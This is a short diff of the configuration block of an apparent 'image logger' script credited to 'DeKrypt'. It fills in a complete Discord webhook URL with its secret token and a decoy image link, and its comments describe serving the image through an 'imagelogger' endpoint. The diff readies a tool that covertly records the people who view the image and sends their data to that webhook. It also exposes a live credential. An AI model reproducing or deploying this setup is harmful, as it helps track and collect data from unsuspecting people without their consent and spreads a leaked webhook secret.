@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "WEBHOOK HERE !",
-    "image": "IMAGE HERE !", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1445104393245429780/aSx3ZGg1VuCRZFFk7NgnfaNRr4es0LtsLa9Z22WgMz9UE5GCSz1fIQeyMkFb4BoCzbQI",
+    "image": "https://imgs.search.brave.com/ZBDpoBVWpC34gad3faTGt_g5eHD_8PU3UcH2l1SvN2Y/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly9ibG9n/Z2VyLmdvb2dsZXVz/ZXJjb250ZW50LmNv/bS9pbWcvYi9SMjl2/WjJ4bC9BVnZYc0Vq/dTFjYjZDTUtqQ2RT/eHVFNzdyLXpqd1NY/VXpIbk1MNFJRVjVY/b29GcHAwLVlQc1pQ/NU5oWFdPM3RJSDU1/TFdpN2swazZINXhH/V2JES1ZPaDlmaHhr/TnlUaXl0UVZWOTFW/OVgteEVHa0hYQnA0/QVdzejg5MXRia3kw/VUNGbm9JdkdYV0Nz/bHhESkduS1ozVXBv/azNVa3NIazFBZFJQ/NjRRZlM3aE5yV290/Q0FHdzJ6ZHpQaFNv/R24wTnIvdzY0OS1o/NDg3LXJ3LyVEOCVB/RSVEOSU4NCVEOSU4/MSVEOSU4QSVEOCVB/NyVEOCVBQSUyMCVE/OSU4MiVEOCVCNyVE/OCVCNyUyMCVEOSU4/MyVEOSU4QSVEOSU4/OCVEOCVBQSUyMCVE/OSU4NCVEOSU4NCVE/OCVBOCVEOSU4NiVE/OCVBNyVEOCVBQS02/LmpwZw", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
